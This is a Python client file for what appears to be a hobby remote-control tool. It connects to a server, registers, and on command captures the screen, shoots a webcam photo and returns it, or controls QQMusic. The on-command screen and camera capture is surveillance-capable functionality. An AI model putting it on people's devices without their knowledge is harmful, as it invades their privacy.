# -*- coding: UTF-8 -*-

import threading
import struct

from app.QQMusic import QQMusic
from core.Camera import Camera
from core.Client import Client
from core.Register import Register
from core.Screen import Screen


class Runner(object):
    def __init__(self, ip, port):
        self.__client = Client(ip, port)
        Register(self.__client).register()
        self.__music = QQMusic()

    def start(self):
        while True:
            command = self.__client.receive()
            if command == '':
                pass
            elif command.get_type() == 1:
                print('Heartbeat: Pong')
            elif command.get_type() == 2:
                thread = threading.Thread(target=self.execute(command), name='ExecuteStringThread')
                thread.start()
            elif command.get_type() == 3:
                self.save_capture(command)
            elif command.get_type() == 0x7FFFFFFF:
                print('Receive: OK')
            elif command.get_type() == 0x10000002:
                print(struct.unpack("!i", command.get_data())[0])
            elif command.get_type() == 0x7FFFFFFE:
                print('Error: ' + command.get_data().decode('utf-8'))
            else:
                print("This is error command")

    def execute(self, command):
        message = command.get_data().decode('utf-8')
        print('Receive: ' + message)
        if message == 'screen':
            Screen(command, self.__client).capture()
        if message == 'camera':
            Camera(command, self.__client).shoot()
        else:
            self.__music.run(message)

    def save_capture(self, command):
        with open('capture.jpg', 'wb') as f:
            f.write(command.get_data())
